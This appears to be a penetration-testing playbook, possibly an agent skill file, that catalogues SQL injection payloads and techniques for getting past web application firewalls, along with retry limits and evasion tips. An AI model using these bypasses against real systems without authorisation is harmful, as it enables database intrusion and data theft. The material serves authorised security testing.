# Filter & WAF Bypass

## When to Use

- HTTP 403/406 on injection attempts
- "Blocked" or "Forbidden" messages
- Requests timeout only with SQL keywords
- Selective filtering (some payloads work, others don't)

## Bypass Workflow

```
1. Identify what's blocked (keyword? pattern? character?)
2. Apply targeted bypass technique
3. Re-baseline with working payload
4. Continue exploitation
```

## Detection: What's Being Filtered?

**Test individual components:**
```
Plain value:     id=1         → works?
Single quote:    id=1'        → blocked?
Keyword:         id=1 AND 1   → blocked?
Space+keyword:   id=1%20AND   → blocked?
Comment:         id=1--       → blocked?
```

Narrow down the trigger before applying bypasses.

## Keyword Bypasses

### Case Variation
```
AND → AnD, aNd, aND
SELECT → SeLeCt, sElEcT
UNION → UnIoN, uNiOn
```

### Keyword Splitting (MySQL)
```
UN/**/ION SE/**/LECT
U/**/NION/**/ALL/**/SE/**/LECT
```

### Alternative Keywords
```
AND → &&
OR  → ||
=   → LIKE, REGEXP, BETWEEN
!=  → <>
```

### URL Encoding
```
Single:   %27
Double:   %2527 (double encode)
Space:    %20, %09 (tab), %0a (newline)
AND:      %41%4e%44
```

### Unicode/Overlong UTF-8
```
' → %c0%a7, %e0%80%a7
```

## Space Bypasses

**Comments as spaces:**
```
UNION/**/SELECT
UNION/*foo*/SELECT
UNION/*!SELECT*/       -- MySQL version comment
```

**Alternative whitespace:**
```
%09  (tab)
%0a  (newline)  
%0b  (vertical tab)
%0c  (form feed)
%0d  (carriage return)
%a0  (non-breaking space)
```

**Parentheses (no space needed):**
```
UNION(SELECT(1),(2),(3))
```

## Quote Bypasses

**Hex encoding:**
```
'admin' → 0x61646d696e
```

**CHAR function:**
```
MySQL:  CHAR(97,100,109,105,110)
MSSQL:  CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
```

**String concatenation:**
```
'admin' → CONCAT('adm','in')
'admin' → 'adm''in' (escaped quote)
```

## Comment Bypasses

```
--      (standard)
-- -    (space after)
--+     (URL: --+)
#       (MySQL)
%23     (URL encoded #)
/**/    (inline)
;%00    (null byte termination)
```

## UNION Bypasses

**All/Distinct:**
```
UNION ALL SELECT
UNION DISTINCT SELECT
```

**Keyword alternatives:**
```
UNION [ALL|DISTINCT] SELECT → /*!50000UNION*/ SELECT
```

## Function Bypasses

**String functions:**
```
SUBSTRING → SUBSTR, MID, LEFT, RIGHT
CONCAT    → CONCAT_WS, GROUP_CONCAT
ASCII     → ORD, HEX
```

**Blocked IF:**
```
IF(x,y,z) → CASE WHEN x THEN y ELSE z END
IF(x,y,z) → SELECT y WHERE x UNION SELECT z WHERE NOT x
```

**Blocked SLEEP:**
```
SLEEP(5) → BENCHMARK(10000000,SHA1('x'))
SLEEP(5) → (SELECT * FROM (SELECT(SLEEP(5)))a)
```

## WAF-Specific Patterns

**Double URL encoding:**
```
' → %27 → %2527
```

**JSON/unexpected content-type:**
```
Content-Type: application/json
{"id": "1 AND 1=1"}
```

**HTTP Parameter Pollution:**
```
?id=1&id=2 AND 1=1    → backend might use second value
```

**Chunked transfer:**
Some WAFs fail to inspect chunked bodies properly.

## Bypass Verification

After finding a working bypass:

1. **Re-baseline** with the bypass payload structure
2. **Verify injection still works** with TRUE/FALSE tests
3. **Proceed with classification** using bypass format for all subsequent payloads

## Attempt Limits

- Max 10 bypass variations per blocked element
- If no bypass found after 20 total attempts → document as filtered, move on
- Success = one working bypass per blocked element

## Common Failures

| Symptom | Cause | Fix |
|---------|-------|-----|
| All bypasses blocked | Advanced WAF | Try HPP, chunked, or different parameter |
| Bypass works once, then blocked | Adaptive WAF | Vary payload structure each request |
| Random blocking | Rate-based WAF | Slow down requests |

## When to Give Up

- 20+ bypass attempts with no success
- WAF adapts to each new technique
- Only blind methods available but responses are rate-limited

Document WAF presence and move to next target or escalate for manual review.
